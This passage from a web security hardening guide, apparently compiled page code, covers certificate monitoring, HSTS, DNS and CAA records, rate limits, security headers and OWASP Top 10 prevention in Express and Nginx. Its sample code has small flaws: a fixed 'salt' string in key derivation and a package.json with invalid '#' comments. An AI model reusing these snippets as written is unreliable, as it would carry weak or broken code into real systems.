socket.getPeerCertificate();\n\n      if (!socket.authorized) {\n        reject(new Error('Certificate not authorized'));\n      }\n\n      const daysUntilExpiry = Math.floor(\n        (new Date(cert.valid_to) - new Date()) / (1000 * 60 * 60 * 24)\n      );\n\n      socket.end();\n      resolve({\n        hostname,\n        issuer: cert.issuer.O,\n        validFrom: cert.valid_from,\n        validTo: cert.valid_to,\n        daysUntilExpiry\n      });\n    });\n\n    socket.on('error', reject);\n  });\n}\n\n// Alert if certificate expires soon\nconst domains = ['example.com', 'api.example.com'];\n\nsetInterval(async () => {\n  for (const domain of domains) {\n    const cert = await checkCertificateExpiry(domain);\n\n    if (cert.daysUntilExpiry < 30) {\n      console.warn(`Certificate for ${domain} expires in ${cert.daysUntilExpiry} days!`);\n      // Send alert\n    }\n  }\n}, 24 * 60 * 60 * 1000); // Check daily\n"})}),"\n",(0,r.jsx)(n.h3,{id:"http-strict-transport-security-hsts",children:"HTTP Strict Transport Security (HSTS)"}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Header Configuration:"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-javascript",children:"// Express\napp.use((req, res, next) => {\n  res.setHeader(\n    'Strict-Transport-Security',\n    'max-age=63072000; includeSubDomains; preload'\n  );\n  next();\n});\n\n// Or use Helmet\nconst helmet = require('helmet');\n\napp.use(helmet.hsts({\n  maxAge: 63072000, // 2 years\n  includeSubDomains: true,\n  preload: true\n}));\n"})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"HSTS Preload:"})}),"\n",(0,r.jsxs)(n.ol,{children:["\n",(0,r.jsxs)(n.li,{children:["Set header with ",(0,r.jsx)(n.code,{children:"preload"})," directive"]}),"\n",(0,r.jsxs)(n.li,{children:["Submit domain to ",(0,r.jsx)(n.a,{href:"https://hstspreload.org",children:"https://hstspreload.org"})]}),"\n",(0,r.jsx)(n.li,{children:"Domain will be hardcoded into browsers"}),"\n"]}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Requirements for Preload:"})}),"\n",(0,r.jsxs)(n.ul,{children:["\n",(0,r.jsx)(n.li,{children:"Valid certificate"}),"\n",(0,r.jsx)(n.li,{children:"Redirect HTTP to HTTPS on same host"}),"\n",(0,r.jsx)(n.li,{children:"Serve HSTS header on all subdomains"}),"\n",(0,r.jsxs)(n.li,{children:["HSTS ",(0,r.jsx)(n.code,{children:"max-age"})," at least 31536000 (1 year)"]}),"\n",(0,r.jsxs)(n.li,{children:["Include ",(0,r.jsx)(n.code,{children:"includeSubDomains"})," directive"]}),"\n",(0,r.jsxs)(n.li,{children:["Include ",(0,r.jsx)(n.code,{children:"preload"})," directive"]}),"\n"]}),"\n",(0,r.jsx)(n.h3,{id:"dns-security",children:"DNS Security"}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"DNSSEC:"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:"# Enable DNSSEC on your domain\n# Cloudflare example\n# In Cloudflare dashboard: DNS > DNSSEC > Enable\n"})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"DNS over HTTPS (DoH):"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-javascript",children:"// Configure DNS resolver in application\nconst dns = require('dns').promises;\n\ndns.setServers([\n  '1.1.1.1', // Cloudflare\n  '8.8.8.8'  // Google\n]);\n"})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Subdomain Takeover Prevention:"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:"# Remove unused DNS records\n# Monitor for dangling CNAMEs pointing to:\n# - Deleted cloud resources (S3, Azure, etc.)\n# - Expired services (Heroku, GitHub Pages)\n# - Unused CDN endpoints\n\n# Example vulnerable record:\nblog.example.com CNAME old-app.herokuapp.com # If old-app is deleted, anyone can claim it!\n"})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"CAA Records:"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:'# Specify which CAs can issue certificates for your domain\nexample.com. CAA 0 issue "letsencrypt.org"\nexample.com. CAA 0 issuewild "letsencrypt.org"\nexample.com. CAA 0 iodef "mailto:security@example.com"\n'})}),"\n",(0,r.jsx)(n.h3,{id:"ddos-protection",children:"DDoS Protection"}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Application-Level Protection:"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-javascript",children:"// Request size limits\napp.use(express.json({ limit: '10kb' }));\napp.use(express.urlencoded({ extended: true, limit: '10kb' }));\n\n// Slow request timeout\nconst timeout = require('connect-timeout');\napp.use(timeout('5s'));\n\n// Connection limits\nconst server = app.listen(3000);\nserver.maxConnections = 1000;\n\n// Rate limiting (see previous section)\n"})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Nginx Configuration:"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-nginx",children:"# Connection limits per IP\nlimit_conn_zone $binary_remote_addr zone=addr:10m;\nlimit_conn addr 10;\n\n# Request rate limiting\nlimit_req_zone $binary_remote_addr zone=one:10m rate=10r/s;\nlimit_req zone=one burst=20 nodelay;\n\n# Timeout settings\nclient_body_timeout 12;\nclient_header_timeout 12;\nkeepalive_timeout 15;\nsend_timeout 10;\n\n# Buffer limits\nclient_body_buffer_size 1K;\nclient_header_buffer_size 1k;\nclient_max_body_size 1k;\nlarge_client_header_buffers 2 1k;\n"})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"CDN & WAF:"})}),"\n",(0,r.jsxs)(n.ul,{children:["\n",(0,r.jsx)(n.li,{children:"Use Cloudflare, AWS CloudFront, or Fastly"}),"\n",(0,r.jsx)(n.li,{children:"Enable WAF (Web Application Firewall)"}),"\n",(0,r.jsx)(n.li,{children:"Configure rate limiting rules"}),"\n",(0,r.jsx)(n.li,{children:"Enable bot protection"}),"\n",(0,r.jsx)(n.li,{children:"Use challenge pages for suspicious traffic"}),"\n"]}),"\n",(0,r.jsx)(n.hr,{}),"\n",(0,r.jsx)(n.h2,{id:"8-security-headers",children:"8. Security Headers"}),"\n",(0,r.jsx)(n.h3,{id:"essential-headers-overview",children:"Essential Headers Overview"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-javascript",children:"const helmet = require('helmet');\n\n// Use Helmet for automatic header configuration\napp.use(helmet({\n  contentSecurityPolicy: {\n    directives: {\n      defaultSrc: [\"'self'\"],\n      scriptSrc: [\"'self'\", \"'nonce-{RANDOM}'\"],\n      styleSrc: [\"'self'\", \"'unsafe-inline'\"],\n      imgSrc: [\"'self'\", \"https:\", \"data:\"],\n      connectSrc: [\"'self'\", \"https://api.example.com\"],\n      fontSrc: [\"'self'\", \"https://fonts.gstatic.com\"],\n      objectSrc: [\"'none'\"],\n      mediaSrc: [\"'self'\"],\n      frameSrc: [\"'none'\"],\n      baseUri: [\"'self'\"],\n      formAction: [\"'self'\"],\n      frameAncestors: [\"'none'\"],\n      upgradeInsecureRequests: []\n    }\n  },\n  strictTransportSecurity: {\n    maxAge: 63072000,\n    includeSubDomains: true,\n    preload: true\n  },\n  referrerPolicy: {\n    policy: 'strict-origin-when-cross-origin'\n  },\n  xContentTypeOptions: true,\n  xFrameOptions: { action: 'deny' },\n  xXssProtection: true\n}));\n\n// Or set manually\napp.use((req, res, next) => {\n  // CSP\n  res.setHeader('Content-Security-Policy', \"default-src 'self'\");\n\n  // HSTS\n  res.setHeader('Strict-Transport-Security', 'max-age=63072000; includeSubDomains; preload');\n\n  // Prevent MIME sniffing\n  res.setHeader('X-Content-Type-Options', 'nosniff');\n\n  // Clickjacking protection\n  res.setHeader('X-Frame-Options', 'DENY');\n\n  // XSS protection (legacy)\n  res.setHeader('X-XSS-Protection', '1; mode=block');\n\n  // Referrer policy\n  res.setHeader('Referrer-Policy', 'strict-origin-when-cross-origin');\n\n  // Permissions policy\n  res.setHeader('Permissions-Policy', 'geolocation=(), microphone=(), camera=()');\n\n  next();\n});\n"})}),"\n",(0,r.jsx)(n.h3,{id:"content-security-policy-detailed",children:"Content-Security-Policy (Detailed)"}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Comprehensive Policy:"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-http",children:"Content-Security-Policy:\n  default-src 'self';\n  script-src 'self' 'nonce-{random}' https://trusted-cdn.com;\n  style-src 'self' 'nonce-{random}' https://fonts.googleapis.com;\n  img-src 'self' https: data: blob:;\n  font-src 'self' https://fonts.gstatic.com;\n  connect-src 'self' https://api.example.com wss://ws.example.com;\n  media-src 'self' https://media.example.com;\n  object-src 'none';\n  frame-src 'none';\n  base-uri 'self';\n  form-action 'self';\n  frame-ancestors 'none';\n  upgrade-insecure-requests;\n  block-all-mixed-content;\n  report-uri /csp-violation-report;\n"})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Progressive Enhancement:"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-javascript",children:"// Start with report-only mode\napp.use((req, res, next) => {\n  const nonce = crypto.randomBytes(16).toString('base64');\n  res.locals.nonce = nonce;\n\n  res.setHeader('Content-Security-Policy-Report-Only', `\n    default-src 'self';\n    script-src 'self' 'nonce-${nonce}';\n    style-src 'self' 'nonce-${nonce}';\n    report-uri /csp-violation-report;\n  `.replace(/\\s+/g, ' ').trim());\n\n  next();\n});\n\n// Collect violations\napp.post('/csp-violation-report', express.json({ type: 'application/csp-report' }), (req, res) => {\n  const report = req.body['csp-report'];\n\n  console.log('CSP Violation:', {\n    documentUri: report['document-uri'],\n    violatedDirective: report['violated-directive'],\n    blockedUri: report['blocked-uri'],\n    originalPolicy: report['original-policy']\n  });\n\n  // Send to monitoring service\n  monitoring.track('csp-violation', report);\n\n  res.status(204).end();\n});\n\n// After analyzing violations, switch to enforcement mode\n"})}),"\n",(0,r.jsx)(n.h3,{id:"x-frame-options",children:"X-Frame-Options"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-javascript",children:"// Deny all framing\nres.setHeader('X-Frame-Options', 'DENY');\n\n// Allow framing only from same origin\nres.setHeader('X-Frame-Options', 'SAMEORIGIN');\n\n// Note: X-Frame-Options is legacy, use CSP frame-ancestors instead\nres.setHeader('Content-Security-Policy', \"frame-ancestors 'none'\");\n"})}),"\n",(0,r.jsx)(n.h3,{id:"x-content-type-options",children:"X-Content-Type-Options"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-javascript",children:"// Prevent MIME-sniffing\nres.setHeader('X-Content-Type-Options', 'nosniff');\n\n// Always set correct Content-Type\nres.setHeader('Content-Type', 'application/json; charset=utf-8');\n"})}),"\n",(0,r.jsx)(n.h3,{id:"referrer-policy",children:"Referrer-Policy"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-javascript",children:"// Policies from most to least restrictive:\n\n// No referrer information\nres.setHeader('Referrer-Policy', 'no-referrer');\n\n// Send only origin on cross-origin requests\nres.setHeader('Referrer-Policy', 'origin');\n\n// Send full URL for same-origin, only origin for cross-origin\nres.setHeader('Referrer-Policy', 'origin-when-cross-origin');\n\n// Send full URL for same-origin and HTTPS cross-origin\nres.setHeader('Referrer-Policy', 'strict-origin-when-cross-origin');\n\n// Send full URL for HTTPS->HTTPS, nothing for HTTPS->HTTP\nres.setHeader('Referrer-Policy', 'strict-origin');\n\n// Recommended for most applications\nres.setHeader('Referrer-Policy', 'strict-origin-when-cross-origin');\n"})}),"\n",(0,r.jsx)(n.h3,{id:"permissions-policy",children:"Permissions-Policy"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-javascript",children:"// Disable sensitive features\nres.setHeader('Permissions-Policy', [\n  'camera=()',\n  'microphone=()',\n  'geolocation=()',\n  'interest-cohort=()', // Disable FLoC\n  'payment=()',\n  'usb=()',\n  'magnetometer=()',\n  'gyroscope=()',\n  'speaker=()'\n].join(', '));\n\n// Allow specific features for same-origin\nres.setHeader('Permissions-Policy', 'geolocation=(self), microphone=(self)');\n\n// Allow for specific origins\nres.setHeader('Permissions-Policy', 'geolocation=(self \"https://maps.example.com\")');\n"})}),"\n",(0,r.jsx)(n.h3,{id:"complete-header-configuration",children:"Complete Header Configuration"}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Next.js (next.config.js):"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-javascript",children:"module.exports = {\n  async headers() {\n    return [\n      {\n        source: '/:path*',\n        headers: [\n          {\n            key: 'Strict-Transport-Security',\n            value: 'max-age=63072000; includeSubDomains; preload'\n          },\n          {\n            key: 'X-Frame-Options',\n            value: 'DENY'\n          },\n          {\n            key: 'X-Content-Type-Options',\n            value: 'nosniff'\n          },\n          {\n            key: 'Referrer-Policy',\n            value: 'strict-origin-when-cross-origin'\n          },\n          {\n            key: 'Permissions-Policy',\n            value: 'camera=(), microphone=(), geolocation=()'\n          }\n        ]\n      }\n    ];\n  }\n};\n"})}),"\n",(0,r.jsx)(n.hr,{}),"\n",(0,r.jsx)(n.h2,{id:"9-owasp-top-10-deep-dive",children:"9. OWASP Top 10 Deep Dive"}),"\n",(0,r.jsx)(n.h3,{id:"a01-broken-access-control",children:"A01: Broken Access Control"}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Examples:"})}),"\n",(0,r.jsxs)(n.ul,{children:["\n",(0,r.jsx)(n.li,{children:"Accessing resources without authentication"}),"\n",(0,r.jsx)(n.li,{children:"Bypassing access control checks"}),"\n",(0,r.jsx)(n.li,{children:"IDOR vulnerabilities"}),"\n",(0,r.jsx)(n.li,{children:"Privilege escalation"}),"\n",(0,r.jsx)(n.li,{children:"CORS misconfiguration"}),"\n"]}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Prevention:"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-javascript",children:"// Centralized authorization\nclass AccessControl {\n  static can(user, action, resource) {\n    // Check user role\n    if (!user || !user.role) return false;\n\n    // Admin can do everything\n    if (user.role === 'admin') return true;\n\n    // Resource-specific checks\n    switch (action) {\n      case 'read':\n        return resource.visibility === 'public' || resource.ownerId === user.id;\n      case 'update':\n      case 'delete':\n        return resource.ownerId === user.id;\n      default:\n        return false;\n    }\n  }\n}\n\n// Middleware\nfunction requireAccess(action) {\n  return async (req, res, next) => {\n    const resource = await getResource(req.params.id);\n\n    if (!AccessControl.can(req.user, action, resource)) {\n      return res.status(403).json({ error: 'Forbidden' });\n    }\n\n    req.resource = resource;\n    next();\n  };\n}\n\n// Usage\napp.put('/api/posts/:id',\n  authenticateToken,\n  requireAccess('update'),\n  updatePost\n);\n"})}),"\n",(0,r.jsx)(n.h3,{id:"a02-cryptographic-failures",children:"A02: Cryptographic Failures"}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Common Issues:"})}),"\n",(0,r.jsxs)(n.ul,{children:["\n",(0,r.jsx)(n.li,{children:"Storing passwords in plain text"}),"\n",(0,r.jsx)(n.li,{children:"Weak encryption algorithms"}),"\n",(0,r.jsx)(n.li,{children:"Using deprecated protocols (FTP, Telnet)"}),"\n",(0,r.jsx)(n.li,{children:"Transmitting sensitive data over HTTP"}),"\n",(0,r.jsx)(n.li,{children:"Weak key management"}),"\n"]}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Prevention:"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-javascript",children:"// Strong password hashing\nconst argon2 = require('argon2');\n\nasync function hashPassword(password) {\n  return await argon2.hash(password, {\n    type: argon2.argon2id,\n    memoryCost: 2 ** 16,\n    timeCost: 3,\n    parallelism: 1\n  });\n}\n\n// Encryption at rest\nconst crypto = require('crypto');\n\nconst ALGORITHM = 'aes-256-gcm';\nconst KEY = crypto.scryptSync(process.env.ENCRYPTION_KEY, 'salt', 32);\n\nfunction encrypt(text) {\n  const iv = crypto.randomBytes(16);\n  const cipher = crypto.createCipheriv(ALGORITHM, KEY, iv);\n\n  let encrypted = cipher.update(text, 'utf8', 'hex');\n  encrypted += cipher.final('hex');\n\n  const authTag = cipher.getAuthTag();\n\n  return {\n    encrypted,\n    iv: iv.toString('hex'),\n    authTag: authTag.toString('hex')\n  };\n}\n\nfunction decrypt(encrypted, iv, authTag) {\n  const decipher = crypto.createDecipheriv(\n    ALGORITHM,\n    KEY,\n    Buffer.from(iv, 'hex')\n  );\n\n  decipher.setAuthTag(Buffer.from(authTag, 'hex'));\n\n  let decrypted = decipher.update(encrypted, 'hex', 'utf8');\n  decrypted += decipher.final('utf8');\n\n  return decrypted;\n}\n\n// Secure data transmission\napp.use((req, res, next) => {\n  if (!req.secure && process.env.NODE_ENV === 'production') {\n    return res.redirect(301, `https://${req.headers.host}${req.url}`);\n  }\n  next();\n});\n"})}),"\n",(0,r.jsx)(n.h3,{id:"a03-injection",children:"A03: Injection"}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Types:"})}),"\n",(0,r.jsxs)(n.ul,{children:["\n",(0,r.jsx)(n.li,{children:"SQL Injection"}),"\n",(0,r.jsx)(n.li,{children:"NoSQL Injection"}),"\n",(0,r.jsx)(n.li,{children:"OS Command Injection"}),"\n",(0,r.jsx)(n.li,{children:"LDAP Injection"}),"\n",(0,r.jsx)(n.li,{children:"XPath Injection"}),"\n"]}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Prevention (already covered in detail above):"})}),"\n",(0,r.jsxs)(n.ul,{children:["\n",(0,r.jsx)(n.li,{children:"Use parameterized queries"}),"\n",(0,r.jsx)(n.li,{children:"Input validation"}),"\n",(0,r.jsx)(n.li,{children:"Least privilege"}),"\n",(0,r.jsx)(n.li,{children:"Escape special characters"}),"\n"]}),"\n",(0,r.jsx)(n.h3,{id:"a04-insecure-design",children:"A04: Insecure Design"}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Examples:"})}),"\n",(0,r.jsxs)(n.ul,{children:["\n",(0,r.jsx)(n.li,{children:"Missing security controls in design phase"}),"\n",(0,r.jsx)(n.li,{children:"No threat modeling"}),"\n",(0,r.jsx)(n.li,{children:"Insufficient rate limiting"}),"\n",(0,r.jsx)(n.li,{children:"Business logic flaws"}),"\n"]}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Prevention:"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-javascript",children:"// Threat modeling example: Money transfer\nclass TransferService {\n  async transfer(from, to, amount) {\n    // Security controls designed from start\n\n    // 1. Authentication check\n    if (!from.isAuthenticated) {\n      throw new Error('Unauthorized');\n    }\n\n    // 2. Authorization check\n    if (from.id !== currentUser.id) {\n      throw new Error('Cannot transfer from another account');\n    }\n\n    // 3. Input validation\n    if (amount <= 0 || amount > 1000000) {\n      throw new Error('Invalid amount');\n    }\n\n    // 4. Business logic validation\n    if (from.balance < amount) {\n      throw new Error('Insufficient funds');\n    }\n\n    // 5. Rate limiting\n    const recentTransfers = await this.getRecentTransfers(from.id, 3600000);\n    if (recentTransfers.length >= 10) {\n      throw new Error('Transfer limit exceeded');\n    }\n\n    // 6. Fraud detection\n    if (await this.isSuspicious(from, to, amount)) {\n      await this.flagForReview(from, to, amount);\n      throw new Error('Transfer flagged for review');\n    }\n\n    // 7. Atomic transaction\n    await db.transaction(async (trx) => {\n      await trx('accounts').where({ id: from.id }).decrement('balance', amount);\n      await trx('accounts').where({ id: to.id }).increment('balance', amount);\n      await trx('transfers').insert({ from: from.id, to: to.id, amount, timestamp: Date.now() });\n    });\n\n    // 8. Audit logging\n    await this.logTransfer(from, to, amount);\n\n    // 9. Notification\n    await this.notifyUsers(from, to, amount);\n  }\n}\n"})}),"\n",(0,r.jsx)(n.h3,{id:"a05-security-misconfiguration",children:"A05: Security Misconfiguration"}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Common Issues:"})}),"\n",(0,r.jsxs)(n.ul,{children:["\n",(0,r.jsx)(n.li,{children:"Default credentials"}),"\n",(0,r.jsx)(n.li,{children:"Unnecessary features enabled"}),"\n",(0,r.jsx)(n.li,{children:"Detailed error messages"}),"\n",(0,r.jsx)(n.li,{children:"Missing security headers"}),"\n",(0,r.jsx)(n.li,{children:"Outdated software"}),"\n"]}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Prevention:"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-javascript",children:"// Remove default accounts\n// Remove unused dependencies\n// Disable directory listing\n// Hide server version\n\n// Express security\napp.disable('x-powered-by');\n\n// Error handling\nif (process.env.NODE_ENV === 'production') {\n  app.use((err, req, res, next) => {\n    console.error(err); // Log server-side\n    res.status(500).json({ error: 'Internal server error' }); // Generic client message\n  });\n} else {\n  app.use((err, req, res, next) => {\n    console.error(err);\n    res.status(500).json({ error: err.message, stack: err.stack });\n  });\n}\n\n// Nginx security\nserver {\n    # Hide version\n    server_tokens off;\n\n    # Disable directory listing\n    autoindex off;\n\n    # Remove unnecessary methods\n    if ($request_method !~ ^(GET|POST|PUT|DELETE|HEAD)$ ) {\n        return 405;\n    }\n}\n"})}),"\n",(0,r.jsx)(n.h3,{id:"a06-vulnerable-and-outdated-components",children:"A06: Vulnerable and Outdated Components"}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Prevention:"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:'# Check for vulnerabilities\nnpm audit\nnpm audit fix\n\n# Update dependencies\nnpm outdated\nnpm update\n\n# Use specific versions (not ranges)\n# package.json\n{\n  "dependencies": {\n    "express": "4.18.2", # Not "^4.18.2"\n  }\n}\n\n# Lock file\nnpm ci # Use package-lock.json for reproducible builds\n\n# Automated scanning\n# GitHub Dependabot\n# Snyk\n# OWASP Dependency-Check\n'})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Monitoring:"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-javascript",children:"// npm-check\nconst npmCheck = require('npm-check');\n\nasync function checkDependencies() {\n  const currentState = await npmCheck();\n\n  currentState.get('packages').forEach(pkg => {\n    if (pkg.unused) {\n      console.warn(`Unused package: ${pkg.moduleName}`);\n    }\n    if (pkg.bump) {\n      console.warn(`Update available: ${pkg.moduleName} ${pkg.installed} \u2192 ${pkg.latest}`);\n    }\n  });\n}\n\n// Run monthly\nsetInterval(checkDependencies, 30 * 24 * 60 * 60 * 1000);\n"})}),"\n",(0,r.jsx)(n.h3,{id:"a07-identification-and-authentication-failures",children:"A07: Identification and Authentication Failures"}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Prevention:"})}),"\n",(0,r.jsxs)(n.ul,{children:["\n",(0,r.jsx)(n.li,{children:"Implement MFA"}),"\n",(0,r.jsx)(n.li,{children:"Secure password reset"}),"\n",(0,r.jsx)(n.li,{children:"Session management"}),"\n",(0,r.jsx)(n.li,{children:"Account lockout"}),"\n"]}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Secure Password Reset:"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-javascript",children:"// Generate reset token\nasync function requestPasswordReset(email) {\n  const user = await getUserByEmail(email);\n\n  if (!user) {\n    // Don't reveal if email exists\n    return { success: true };\n  }\n\n  // Generate secure token\n  const token = crypto.randomBytes(32).toString('hex');\n  const hashedToken = crypto.createHash('sha256').update(token).digest('hex');\n\n  // Store with expiration\n  await db.query(\n    'UPDATE users SET reset_token = ?, reset_token_expires = ? WHERE id = ?',\n    [hashedToken, Date.now() + 3600000, user.id] // 1 hour\n  );\n\n  // Send email with token\n  await sendEmail(user.email, 'Password Reset', `\n    Reset your password: https://example.com/reset-password?token=${token}\n    This link expires in 1 hour.\n  `);\n\n  return { success: true };\n}\n\n// Verify and reset\nasync function resetPassword(token, newPassword) {\n  const hashedToken = crypto.createHash('sha256').update(token).digest('hex');\n\n  const user = await db.query(\n    'SELECT * FROM users WHERE reset_token = ? AND reset_token_expires > ?',\n    [hashedToken, Date.now()]\n  );\n\n  if (!user) {\n    throw new Error('Invalid or expired token');\n  }\n\n  // Validate new password\n  validatePassword(newPassword);\n\n  // Hash new password\n  const hashedPassword = await argon2.hash(newPassword);\n\n  // Update password and clear reset token\n  await db.query(\n    'UPDATE users SET password = ?, reset_token = NULL, reset_token_expires = NULL, token_version = token_version + 1 WHERE id = ?',\n    [hashedPassword, user.id]\n  );\n\n  // Invalidate all sessions\n  await invalidateAllSessions(user.id);\n\n  // Notify user\n  await sendEmail(user.email, 'Password Changed', 'Your password has been successfully changed.');\n\n  return { success: true };\n}\n"})}),"\n",(0,r.jsx)(n.h3,{id:"a08-software-and-data-integrity-failures",children:"A08: Software and Data Integrity Failures"}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Prevention:"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-javascript",children:'// Subresource Integrity for CDN resources\n<script\n  src="https://cdn.example.com/library.js"\n  integrity="sha384-oqVuAfXRKap7fdgcCY5uykM6+R9GqQ8K/uxy9rx7HNQlGYl1kPzQho1wx4JwY8wC"\n  crossorigin="anonymous">\n<\/script>\n\n// Verify package integrity\nnpm ci --prefer-offline\n\n// Code signing\n# Sign releases\ngpg --sign --armor release.tar.gz\n\n# Verify signature\ngpg --verify release.tar.gz.asc\n\n// CI/CD pipeline security\n# Use signed commits\ngit commit -S -m "Commit message"\n\n# Verify commits\ngit verify-commit HEAD\n\n# Secure environment variables\n# Never commit secrets\n# Use secret management (AWS Secrets Manager, HashiCorp Vault)\n'})}),"\n",(0,r.jsx)(n.h3,{id:"a09-security-logging-and-monitoring-failures",children:"A09: Security Logging and Monitoring Failures"}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Implementation:"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-javascript",children:"const winston = require('winston');\nconst expressWinston = require('express-winston');\n\n// Configure logger\nconst logger = winston.createLogger({\n  level: 'info',\n  format: winston.format.combine(\n    winston.format.timestamp(),\n    winston.format.errors({ stack: true }),\n    winston.format.json()\n  ),\n  defaultMeta: { service: 'api-server' },\n  transports: [\n    new winston.transports.File({ filename: 'error.log', level: 'error' }),\n    new winston.transports.File({ filename: 'combined.log' })\n  ]\n});\n\n// Log all requests\napp.use(expressWinston.logger({\n  transports: [\n    new winston.transports.File({ filename: 'access.log' })\n  ],\n  format: winston.format.combine(\n    winston.format.timestamp(),\n    winston.format.json()\n  ),\n  meta: true,\n  msg: \"HTTP {{req.method}} {{req.url}}\",\n  expressFormat: true,\n  colorize: false\n}));\n\n// Log security events\nfunction logSecurityEvent(event, details) {\n  logger.warn('Security Event', {\n    event,\n    ...details,\n    timestamp: new Date().toISOString()\n  });\n\n  // Alert if critical\n  if (event === 'multiple_failed_logins' || event === 'suspicious_activity') {\n    alertSecurityTeam(event, details);\n  }\n}\n\n// Monitor failed logins\napp.post('/login', async (req, res) => {\n  const { email, password } = req.body;\n\n  const user = await authenticateUser(email, password);\n\n  if (!user) {\n    logSecurityEvent('failed_login', {\n      email,\n      ip: req.ip,\n      userAgent: req.headers['user-agent']\n    });\n\n    // Check for brute force\n    const recentFailures = await getRecentFailedLogins(email, 900000); // 15 min\n    if (recentFailures >= 5) {\n      logSecurityEvent('multiple_failed_logins', { email, count: recentFailures });\n    }\n\n    return res.status(401).json({ error: 'Invalid credentials' });\n  }\n\n  logSecurityEvent('successful_login', {\n    userId: user.id,\n    ip: req.ip\n  });\n\n  res.json({ success: true });\n});\n\n// Anomaly detection\nfunction detectAnomalies(userId) {\n  const recentActivity = getUserActivity(userId, 3600000); // 1 hour\n\n  // Check for suspicious patterns\n  if (recentActivity.uniqueIPs > 5) {\n    logSecurityEvent('suspicious_activity', {\n      userId,\n      reason: 'Multiple IPs',\n      count: recentActivity.uniqueIPs\n    });\n  }\n\n  if (recentActivity.apiCalls > 1000) {\n    logSecurityEvent('suspicious_activity', {\n      userId,\n      reason: 'Excessive API calls',\n      count: recentActivity.apiCalls\n    });\n  }\n}\n"})}),"\n",(0,r.jsx)(n.h3,{id:"a10-server-side-request-forgery-ssrf",children:"A10: Server-Side Request Forgery (SSRF)"}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.strong,{children:"Prevention (covered earlier, additional examples):"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-javascript",children:"// Whitelist approach\nconst ALLOWED_HOSTS = new Set([\n  'api.github.com',\n  'api.stripe.com',\n  'api.sendgrid.com'\n]);\n\nasync function fetchExternal(url) {\n  const parsed = new URL(url);\n\n  if (!ALLOWED_HOSTS.has(parsed.hostname)) {\n    throw new Error('Host not allowed');\n  }\n\n  const response = await axios.get(url, {\n    timeout: 5000,\n    maxRedirects: 0,\n    validateStatus: status => status === 200\n  });\n\n 